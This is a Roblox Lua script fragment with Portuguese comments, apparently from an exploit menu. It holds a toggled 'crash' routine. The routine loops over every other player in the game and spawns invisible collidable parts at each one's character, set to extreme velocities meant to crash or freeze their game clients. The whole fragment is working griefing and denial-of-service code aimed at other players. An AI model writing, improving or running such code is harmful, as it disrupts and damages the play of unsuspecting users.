-- NOVA LÓGICA DE CRASH (FÍSICA PESADA)
crashBtn.MouseButton1Click:Connect(function()
    crashing = not crashing
    if crashing then
        statusText.Text = "Status: Ativado"; statusDot.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        
        spawn(function()
            while crashing do
                for _, p in pairs(game.Players:GetPlayers()) do
                    if p ~= lp and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                        -- Cria uma "bomba" de colisões no alvo
                        for i = 1, 10 do
                            local crashPart = Instance.new("Part")
                            crashPart.Parent = p.Character
                            crashPart.CFrame = p.Character.HumanoidRootPart.CFrame
                            crashPart.Size = Vector3.new(10, 10, 10)
                            crashPart.Transparency = 1
                            crashPart.Velocity = Vector3.new(9e9, 9e9, 9e9) -- Velocidade infinita para bugar o cliente
                            crashPart.CanCollide = true
                            task.wait()
                            crashPart:Destroy()
                        end
                    end
                end
                task.wait(0.1)
            end
        end)
    else
        statusText.Text = "Status: Desativado"; statusDot.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    end
end)
